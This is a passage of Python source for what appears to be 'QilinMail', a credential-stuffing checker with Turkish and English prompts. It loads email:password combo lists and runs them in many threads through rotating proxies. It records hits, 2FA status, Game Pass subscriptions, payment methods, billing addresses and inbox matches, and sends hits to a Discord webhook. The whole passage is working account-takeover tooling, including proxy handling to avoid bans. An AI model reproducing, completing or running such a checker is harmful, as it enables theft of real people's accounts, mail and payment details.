    print(f"{Fore.BLUE}  [3] Manuel yol gir")
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    choice = input(f"{Fore.CYAN}  Seçim (1/2/3): {Fore.RESET}").strip()

    filename = None

    if choice == '2':
        print(f"{Fore.YELLOW}  Dosya seçici açılıyor...{Fore.RESET}")
        filename = _browse_file()
        if not filename:
            print(f"{Fore.RED}  ✗ Dosya seçilmedi, otomatik aramaya geçiliyor...{Fore.RESET}")
            choice = '1'

    if choice == '3':
        filename = input(f"{Fore.CYAN}  Dosya yolu: {Fore.RESET}").strip().strip('"').strip("'")
        if not os.path.exists(filename):
            print(f"{Fore.RED}  ✗ Dosya bulunamadı: {filename}{Fore.RESET}")
            filename = None

    if choice == '1' or filename is None:
        _auto_names = ['acc.txt', 'combo.txt', 'combos.txt', 'list.txt',
                       'accounts.txt', 'check.txt', 'input.txt', 'mail.txt']
        for _n in _auto_names:
            if os.path.exists(_n):
                filename = _n
                print(f"{Fore.GREEN}  ✓ Otomatik bulundu: {_n}{Fore.RESET}")
                break
        if not filename:
            # Geçerli klasördeki tüm .txt dosyalarını listele
            _txts = [f for f in os.listdir('.') if f.endswith('.txt') and os.path.isfile(f)]
            if _txts:
                print(f"\n{Fore.YELLOW}  Klasörde bulunan .txt dosyaları:{Fore.RESET}")
                for _i, _t in enumerate(_txts, 1):
                    _sz = os.path.getsize(_t)
                    print(f"  {Fore.CYAN}[{_i}] {_t} ({_sz:,} byte){Fore.RESET}")
                _sel = input(f"{Fore.CYAN}  Numara seç (veya Enter ile Browse): {Fore.RESET}").strip()
                if _sel.isdigit() and 1 <= int(_sel) <= len(_txts):
                    filename = _txts[int(_sel) - 1]
                else:
                    filename = _browse_file()
            else:
                print(f"{Fore.YELLOW}  Klasörde .txt dosyası bulunamadı, Browse açılıyor...{Fore.RESET}")
                filename = _browse_file()

    if not filename or not os.path.exists(filename):
        print(f"{Fore.RED}  ✗ Geçerli dosya seçilmedi. Çıkılıyor...{Fore.RESET}")
        time.sleep(2)
        return

    fname = os.path.splitext(os.path.basename(filename))[0]
    try:
        print(f'{Fore.YELLOW}  Yükleniyor...{Fore.RESET}', end='', flush=True)
        with open(filename, 'r', encoding='utf-8', errors='ignore') as e:
            _raw = e.read().splitlines()
        seen = set()
        unique_lines = []
        invalid_count = 0
        lines = _raw
        for _ln in _raw:
            _ln = _ln.strip()
            if not _ln or ':' not in _ln:
                invalid_count += 1
                continue
            _pts = _ln.split(':', 1)
            if len(_pts) < 2:
                invalid_count += 1
                continue
            _em, _pw = _pts[0].strip().lower(), _pts[1].strip()
            if not _em or not _pw or len(_pw) < 4:
                invalid_count += 1
                continue
            if '@' not in _em:
                invalid_count += 1
                continue
            _key = f'{_em}:{_pw}'
            if _key not in seen:
                seen.add(_key)
                unique_lines.append(_ln)
        Combos = unique_lines
        print(f'\r{Fore.GREEN}  ✓ Yüklendi!{Fore.RESET}')
        dupes_removed = len(lines) - len(Combos)
        if dupes_removed > 0:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines) + '\n')
            except:
                pass
        _total_raw = len(lines)
        print(f"\n{Fore.BLUE}{'═' * 55}")
        print(f"{Fore.CYAN}  📄 COMBO DOSYASI İSTATİSTİKLERİ")
        print(f"{Fore.BLUE}{'═' * 55}")
        print(f"{Fore.WHITE}  Dosya       : {Fore.CYAN}{filename}")
        print(f"{Fore.WHITE}  Ham satır   : {Fore.YELLOW}{_total_raw:,}")
        print(f"{Fore.WHITE}  Geçersiz    : {Fore.RED}{invalid_count:,}")
        print(f"{Fore.WHITE}  Duplikasyon : {Fore.YELLOW}{dupes_removed:,}")
        print(f"{Fore.WHITE}  ✓ Yüklenecek: {Fore.GREEN}{len(Combos):,}")
        print(f"{Fore.BLUE}{'═' * 55}{Fore.RESET}")
        if UI_ENABLED and ui:
            ui.log_info(f'Loaded {len(Combos):,} combos ({dupes_removed:,} dupes, {invalid_count:,} invalid)')
        _inp = input(f"{Fore.CYAN}  ▶ Başlamak için Enter'a bas...{Fore.RESET}")
    except (IOError, OSError, MemoryError) as e:
        print(f'\n✗ Error reading combo file: {str(e)}')
        print('Please check the file and try again.')
        time.sleep(2)
        return
    except Exception as e:
        print(f'\n✗ Error reading file: {str(e)}')
        print(f'✗ Your file is probably corrupted or in wrong format.')
        time.sleep(2)
        return
def loadconfig():
    global maxretries, config
    def str_to_bool(value):
        if isinstance(value, bool):
            return value
        return str(value).lower() in ('yes', 'true', 't', '1', 'on')
    config_loader = ConfigLoader('config.ini')
    config_data = config_loader.get_general_config()
    checker_config = config_loader.get_checker_config()
    capture_config = config_loader.get_capture_config()
    maxretries = config_data.get('max_retries', 3)
    config.set('threads', config_data.get('threads', 10))
    config.set('max_retries', maxretries)
    config.set('timeout', config_data.get('timeout', 15))
    config.set('use_proxies', config_data.get('use_proxies', False))
    for key, value in checker_config.items():
        config.set(key, value)
    for key, value in capture_config.items():
        config.set(key, value)
    config.set('scan_inbox', config_data.get('scan_inbox', False))
    config.set('enable_notifications', config_loader.get('enable_notifications', False))
    config.set('discord_webhook_url', config_loader.get('discord_webhook_url', ''))
    config.set('webhook_username', config_loader.get('webhook_username', 'QilinMail Checker'))
    config.set('webhook_avatar_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
    config.set('notify_on_hit', config_loader.get('notify_on_hit', True))
    config.set('notify_on_game_pass', config_loader.get('notify_on_game_pass', True))
    config.set('notify_on_mfa', config_loader.get('notify_on_mfa', True))
    config.set('embed_thumbnail', config_loader.get('embed_thumbnail', True))
    config.set('embed_footer', config_loader.get('embed_footer', True))
    config.set('embed_thumbnail_url', config_loader.get('embed_thumbnail_url', config_loader.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')))
    config.set('embed_image_enabled', config_loader.get('embed_image_enabled', True))
    config.set('embed_image_template', config_loader.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip'))
    embed_color_hit = validate_hex_color(config_loader.get('embed_color_hit', '#57F287'))
    embed_color_xgp = validate_hex_color(config_loader.get('embed_color_xgp', '#3498DB'))
    config.set('embed_color_hit', embed_color_hit if embed_color_hit is not None else 5763719)
    config.set('embed_color_xgp', embed_color_xgp if embed_color_xgp is not None else 3447003)
    config.set('check_microsoft_balance', config_loader.get('check_microsoft_balance', False))
    config.set('check_rewards_points', config_loader.get('check_rewards_points', True))
    config.set('check_payment_methods', config_loader.get('check_payment_methods', True))
    config.set('check_subscriptions', config_loader.get('check_subscriptions', True))
    config.set('check_orders', config_loader.get('check_orders', True))
    config.set('check_billing_address', config_loader.get('check_billing_address', True))
    config.set('scan_inbox', config_loader.get('scan_inbox', True))
    config.set('inbox_keywords', config_loader.get('inbox_keywords', ''))
    proxy_config = config_loader.get_proxy_config()
    config.set('auto_proxy', proxy_config.get('auto_proxy', False))
    config.set('proxy_api', proxy_config.get('proxy_api', ''))
    config.set('request_num', proxy_config.get('request_num', 3))
    config.set('proxy_time', proxy_config.get('proxy_time', 5))
    config.set('show_live_logs', config_loader.get('show_live_logs', True))
    config.set('cui_theme', config_loader.get('theme', 'blue'))
    try:
        config.set('warn_on_slow_check', config_loader.get('warn_on_slow_check', False))
    except Exception:
        config.set('warn_on_slow_check', False)
    try:
        config.set('slow_check_warn_seconds', int(config_loader.get('slow_check_warn_seconds', 75)))
    except Exception:
        config.set('slow_check_warn_seconds', 75)
    config.set('optimize_network', config_loader.get('optimize_network', True))
    config.set('connection_pool_size', config_loader.get('connection_pool_size', 100))
    config.set('dns_cache_enabled', config_loader.get('dns_cache_enabled', True))
    config.set('keep_alive_enabled', config_loader.get('keep_alive_enabled', True))
    return True
def Main():
    global fname, screen, config, proxytype, banproxies, errors, cpm1, hits, bad, twofa, vm, xgp, xgpu, other, mfa, sfa, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, checked, retries
    utils.set_title("QilinMail")
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        if loadconfig():
            print(f'{Fore.GREEN}✓ Configuration loaded successfully{Fore.RESET}')
            if config.get('enable_notifications'):
                webhook_url = config.get('discord_webhook_url', '')
                if webhook_url and webhook_url.strip():
                    print(f'{Fore.GREEN}✓ Discord webhook configured{Fore.RESET}')
                else:
                    print(f'{Fore.YELLOW}⚠ Webhook enabled but no URL set{Fore.RESET}')
        else:
            print(f'{Fore.YELLOW}⚠ Using default configuration{Fore.RESET}')
        ui.config = config
    except Exception as e:
        print(f'{Fore.RED}Error loading configuration: {str(e)}{Fore.RESET}')
        print(f'{Fore.YELLOW}Using default settings{Fore.RESET}')
        traceback.print_exc()
        if config.get('proxylessban') is False and config.get('hypixelban') is True:
            if config.get('differentproxy'):
                print(f'\n{Fore.LIGHTBLUE_EX}Select your SOCKS5 Ban Checking Proxies.{Fore.RESET}')
                banproxyload()
            else:
                banproxies.extend(proxylist)
    _cfg_threads = int(config.get('threads', 0))
    if _cfg_threads > 0:
        thread = _cfg_threads
    elif config.get('auto_tune_threads', True):
        thread = auto_tune_threads()
        print(f'{Fore.YELLOW}  ⚡ Auto-tune: {thread} thread önerildi{Fore.RESET}')
    else:
        thread = 50
    # Kullanıcıdan thread onayı
    try:
        _t_inp = input(f'{Fore.CYAN}  Thread sayısı [{thread}]: {Fore.RESET}').strip()
        if _t_inp.isdigit() and int(_t_inp) > 0:
            thread = int(_t_inp)
    except Exception:
        pass
    print(f'{Fore.GREEN}  ✓ Thread: {thread}{Fore.RESET}')
    optimize_network = config.get('optimize_network', True)
    if optimize_network:
        timeout = get_optimized_timeout(config)
        print(f'{Fore.GREEN}✓ Network optimization: ENABLED (timeout: {timeout}){Fore.RESET}\n')
    else:
        print(f'{Fore.YELLOW}⚠ Network optimization: DISABLED{Fore.RESET}\n')
    Proxys()
    print(f"{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}📁 LOAD COMBO FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    Load()
    if not Combos:
        print(f'{Fore.BLUE}No combos loaded. Exiting...{Fore.RESET}')
        time.sleep(2)
        return
    if not os.path.exists('results'):
        os.makedirs('results/')
    timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
    fname = timestamp
    if not os.path.exists(f'results/{fname}'):
        os.makedirs(f'results/{fname}')
        open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8').close()
    print(f'\n{Fore.GREEN}Starting checker...{Fore.RESET}')
    print(f'{Fore.CYAN}Results will be saved to: results/{fname}{Fore.RESET}\n')
    try:
        threading.Thread(target=logscreen, daemon=True).start()
        print(f'{Fore.GREEN}Checking {len(Combos)} accounts with {thread} threads...{Fore.RESET}\n')
        if UI_ENABLED and ui:
            ui.start_checking(len(Combos))
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            future_to_combo = {executor.submit(Checker, combo): combo for combo in Combos}
            processed_count = 0
            
            try:
                for future in concurrent.futures.as_completed(future_to_combo):
                    combo = future_to_combo[future]
                    processed_count += 1
                    try:
                        future.result()
                    except Exception as e:
                        with stats_lock:
                            errors += 1
                            bad += 1
                            checked += 1
                            cpm += 1
                        if UI_ENABLED and ui:
                            ui.log_error(f'Error: {str(e)[:50]}')
                        else:
                            print(f'{Fore.RED}Worker error: {str(e)[:50]}{Fore.RESET}')
                    
                    if processed_count % 1000 == 0:
                        import gc
                        gc.collect()
            except Exception as e:
                 if UI_ENABLED and ui:
                     ui.log_error(f"Processing error: {e}")
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}⏳ Collecting Final Live Stats...')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'⏳ Collecting Final Live Stats...')
        for countdown in range(5, 0, -1):
            print(f'{Fore.YELLOW}⏳ Collecting Live Stats... {countdown}s remaining{Fore.RESET}', end='\r')
            try:
                utils.set_title(f'⏳ Collecting Live Stats... {countdown}s | Hits: {hits} - Bad: {bad} - 2FA: {twofa} - CPM: {cpm1}')
            except:
                pass
            if UI_ENABLED and ui:
                ui.log_info(f'⏳ Collecting Live Stats... {countdown}s remaining')
                ui.update_stats(hits=hits, bad=bad, twofa=twofa, valid_mail=vm, xgp=xgp, xgpu=xgpu, other=other, mfa=mfa, sfa=sfa, minecraft_capes=minecraft_capes, optifine_capes=optifine_capes, inbox_matches=inbox_matches, name_changes=name_changes, payment_methods=payment_methods, checked=checked, total=len(Combos), cpm=cpm1, retries=retries, errors=errors)
                ui.show_ui_screen()
        try:
            hits_file = f'results/{fname}/Hits.txt'
            if os.path.exists(hits_file):
                with open(hits_file, 'r', encoding='utf-8', errors='ignore') as hf:
                    file_hits = sum((1 for line in hf if line.strip()))
                with stats_lock:
                    if file_hits > hits:
                        hits = file_hits
        except Exception:
            pass
        print(f"\r{' ' * 80}\r", end='')
        print(f'{Fore.GREEN}✅ Live Stats Collected!{Fore.RESET}\n')
        print(f"{Fore.CYAN}{'=' * 60}")
        print(f'{Fore.YELLOW}Final Results:')
        print(f'{Fore.GREEN}   Hits: {hits} {Fore.WHITE}| {Fore.RED}Bad: {bad} {Fore.WHITE}| {Fore.MAGENTA}2FA: {twofa} {Fore.WHITE}| {Fore.GREEN}MFA: {mfa} {Fore.WHITE}| {Fore.YELLOW}SFA: {sfa}')
        print(f'{Fore.LIGHTCYAN_EX}   XGP: {xgp} {Fore.WHITE}| {Fore.CYAN}XGPU: {xgpu} {Fore.WHITE}| {Fore.LIGHTYELLOW_EX}Other: {other} {Fore.WHITE}| {Fore.CYAN}Valid Mail: {vm}')
        print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}\n")
        if UI_ENABLED and ui:
            ui.log_info(f'✅ Live Stats Collected! Final Results:')
            ui.log_info(f'   Hits: {hits} | Bad: {bad} | 2FA: {twofa} | MFA: {mfa} | SFA: {sfa}')
            ui.log_info(f'   XGP: {xgp} | XGPU: {xgpu} | Other: {other} | Valid Mail: {vm}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}')
        else:
            print(f"\n{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.YELLOW}Checking Completed!')
            print(f"{Fore.GREEN}{'=' * 60}")
            print(f'{Fore.WHITE}Total Checked: {checked}')
            print(f'{Fore.GREEN}Hits: {hits}')
            print(f'{Fore.RED}Bad: {bad}')
            print(f'{Fore.MAGENTA}2FA: {twofa}')
            print(f'{Fore.CYAN}Valid Mail: {vm}')
            print(f'{Fore.LIGHTCYAN_EX}Xbox Game Pass Ultimate: {xgpu}')
            print(f'{Fore.LIGHTBLUE_EX}Xbox Game Pass: {xgp}')
            print(f'{Fore.GREEN}MFA: {mfa}')
            print(f'{Fore.YELLOW}SFA: {sfa}')
            print(f'{Fore.LIGHTYELLOW_EX}Other: {other}')
            print(f'{Fore.CYAN}Results saved to: results/{fname}')
            print(f"{Fore.GREEN}{'=' * 60}{Fore.RESET}\n")
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    except KeyboardInterrupt:
        print(f'\n\n{Fore.YELLOW}Checker interrupted by user.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_finished_screen(f'results/{fname}' if fname else 'results/interrupted')
    except Exception as e:
        print(f'\n{Fore.RED}Error: {str(e)}{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.show_error_screen(str(e))
        traceback.print_exc()
        try:
            input('Press Enter to exit...')
        except EOFError:
            pass
    finally:
        print(f'\n{Fore.CYAN}Thank you for using QilinMail!{Fore.RESET}\n')
def detect_proxy_protocol(proxies_list):
    if not proxies_list:
        return '4'
    print(f'{Fore.BLUE}🔍 Detecting proxy type...{Fore.RESET}')
    protocols = [('socks5', '3'), ('socks4', '2'), ('http', '1')]
    max_checks = min(3, len(proxies_list))
    for i in range(max_checks):
        test_proxy = proxies_list[i]
        for scheme, type_code in protocols:
            try:
                proxy_url = f'{scheme}://{test_proxy}'
                proxies = {'http': proxy_url, 'https': proxy_url}
                response = requests.get('http://www.google.com', proxies=proxies, timeout=2)
                if response.status_code == 200:
                    print(f'{Fore.CYAN}✓ Detected {scheme.upper()} proxy{Fore.RESET}')
                    return type_code
            except:
                continue
    print(f'{Fore.BLUE}ℹ Defaulting to HTTP proxy type.{Fore.RESET}')
    return '1'
def Proxys():
    global proxylist, proxytype, auto_proxy, proxy_api_url, proxy_request_num, proxy_time
    print(f"\n{Fore.BLUE}{'=' * 60}")
    print(f'{Fore.CYAN}AUTO LOAD PROXY FILE')
    print(f"{Fore.BLUE}{'=' * 60}{Fore.RESET}")
    filename = 'proxies.txt'
    if not os.path.exists(filename):
        print(f"{Fore.BLUE}⚠ 'proxies.txt' not found.{Fore.RESET}")
        print(f'{Fore.BLUE}Continuing without proxies (Proxyless Mode).{Fore.RESET}')
        proxytype = "'4'"
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            proxylist = [line.strip() for line in f if line.strip()]
        if not proxylist:
            print(f"{Fore.BLUE}⚠ 'proxies.txt' is empty.{Fore.RESET}")
            proxytype = "'4'"
            return
        print(f'{Fore.CYAN}[{len(proxylist)}] Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(proxylist)} proxies loaded')
        detected_type = detect_proxy_protocol(proxylist)
        proxytype = f"'{detected_type}'"
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error reading proxy file: {str(e)}{Fore.RESET}')
        proxytype = "'4'"
        time.sleep(2)
def banproxyload():
    global banproxies
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f'{Fore.YELLOW}Load Ban Checking Proxy File (SOCKS5)')
    print(f"{Fore.CYAN}{'=' * 60}{Fore.RESET}")
    filename = None
    default_file = 'banproxies.txt'
    if os.path.exists(default_file):
        print(f'{Fore.GREEN}Found {default_file} in current directory!{Fore.RESET}')
        try:
            use_default = input(f'{Fore.YELLOW}Use this file? (Y/n): {Fore.RESET}').strip().lower()
        except EOFError:
            use_default = 'y'
        if use_default != 'n':
            filename = default_file
    if filename is None:
        try:
            filename = input(f'{Fore.CYAN}Load Ban Proxy: {Fore.RESET}').strip()
        except EOFError:
            pass
        filename = filename.strip('"').strip("'")
    if not filename or not os.path.exists(filename):
        print(f"{Fore.LIGHTRED_EX}Invalid file path or file doesn't exist.{Fore.RESET}")
        print(f'{Fore.YELLOW}Continuing without ban checking proxies...{Fore.RESET}')
        return
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            banproxies = [line.strip() for line in f if line.strip()]
        print(f'{Fore.LIGHTBLUE_EX}[{len(banproxies)}] Ban Check Proxies Loaded.{Fore.RESET}')
        if UI_ENABLED and ui:
            ui.log_info(f'{len(banproxies)} SOCKS5 proxies loaded for ban checking')
    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error reading ban proxy file: {str(e)}{Fore.RESET}')
        time.sleep(2)
def main():
    Main()
if __name__ == '__main__':
    main()
